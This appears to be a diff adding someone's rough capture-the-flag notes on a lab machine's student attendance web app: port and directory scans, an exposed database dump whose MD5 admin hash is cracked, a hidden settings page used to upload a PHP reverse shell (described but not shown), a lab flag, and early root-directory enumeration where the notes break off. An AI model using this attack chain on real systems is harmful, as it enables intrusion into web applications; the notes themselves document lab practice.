@@ -1,1 +1,94 @@
+└─$ nmap  -p- 192.168.56.102           
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 23:22 PST
+Nmap scan report for 192.168.56.102
+Host is up (0.00021s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+23/tcp open  telnet
+80/tcp open  http
 
+
+└─$ sudo dirsearch -u http://192.168.56.102/student_attendance/
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+[23:19:22] Starting: student_attendance/
+[23:19:24] 403 -  279B  - /student_attendance/.ht_wsr.txt
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess.bak1
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess.orig
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess.sample
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess.save
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess_orig
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess_extra
+[23:19:24] 403 -  279B  - /student_attendance/.htaccess_sc
+[23:19:24] 403 -  279B  - /student_attendance/.htaccessOLD2
+[23:19:24] 403 -  279B  - /student_attendance/.htaccessOLD
+[23:19:24] 403 -  279B  - /student_attendance/.htaccessBAK
+[23:19:24] 403 -  279B  - /student_attendance/.htpasswds
+[23:19:24] 403 -  279B  - /student_attendance/.httr-oauth
+[23:19:24] 403 -  279B  - /student_attendance/.html
+[23:19:24] 403 -  279B  - /student_attendance/.htm
+[23:19:24] 403 -  279B  - /student_attendance/.htpasswd_test
+[23:19:25] 403 -  279B  - /student_attendance/.php
+[23:19:35] 200 -    0B  - /student_attendance/ajax.php
+[23:19:36] 301 -  336B  - /student_attendance/assets  ->  http://192.168.56.102/student_attendance/assets/
+[23:19:36] 200 -  534B  - /student_attendance/assets/
+[23:19:42] 301 -  338B  - /student_attendance/database  ->  http://192.168.56.102/student_attendance/database/
+[23:19:42] 200 -  476B  - /student_attendance/database/
+[23:19:47] 200 -  619B  - /student_attendance/header.php
+[23:19:48] 200 -  950B  - /student_attendance/home.php
+[23:19:52] 200 -    1KB - /student_attendance/login.php
+[23:20:03] 200 -    0B  - /student_attendance/readme.txt
+[23:20:14] 200 -  927B  - /student_attendance/users.php
+
+Index of /student_attendance/database
+    [ ]	student_attendance_db.sql	2020-10-28 23:00 	10K	 
+        --
+        -- Dumping data for table `users`
+        --
+
+        INSERT INTO `users` (`id`, `name`, `username`, `password`, `type`, `faculty_id`) VALUES
+        (1, 'Administrator', 'admin', '0192023a7bbd73250516f069df18b500', 1, 0),
+        (2, 'John Smith', 'jsmith@sample.com', 'af606ddc433ae6471f104872585cf880', 3, 1);
+//the passwd are hashed by md5, got admin.admin123
+//after login, view the sourse code of the home page, find a hidden direcroty.
+
+		<!-- <a href="index.php?page=site_settings" class="nav-item nav-site_settings"><span class='icon-field'><i class="fa fa-cogs text-danger"></i></span> System Settings</a> -->
+//under the page , we can upload php file, I upload a reverse shell, and which is ran automatically, so I got a shell
+
+www-data@school:/home/fox$ cat local.txt
+cat local.txt
+e4ed03b4852906b6cb716fc6ce0f9fd5
+
+www-data@school:/root$ ls -la
+ls -la
+total 36
+drwxr-xr-x  4 root root 4096 Nov  7  2020 .
+drwxr-xr-x 18 root root 4096 Nov  3  2020 ..
+lrwxrwxrwx  1 root root    9 Nov  7  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Oct 27  2020 .ssh
+-rw-------  1 root root  764 Nov  7  2020 .viminfo
+drwxr-xr-x  4 root root 4096 Mar 10 06:15 .wine
+-rw-------  1 root root   33 Nov  7  2020 proof.txt
+-rwxr-xr-x  1 root root   61 Nov  3  2020 win
+www-data@school:/root$ 
+
+www-data@school:/root$ cat win
+cat win
+while true
+ do
+  wine /opt/access/access.exe
+  sleep 3
+ done
+
+www-data@school:/opt/access$ ls -la
+ls -la
+total 88
+drwxr-xr-x 2 root root  4096 Nov  7  2020 .
+drwxr-xr-x 3 root root  4096 Nov  7  2020 ..
+-rw-r--r-- 1 root root 51019 Nov  7  2020 access.exe
+-rw-r--r-- 1 root root 28613 Nov  7  2020 funcs_access.dll
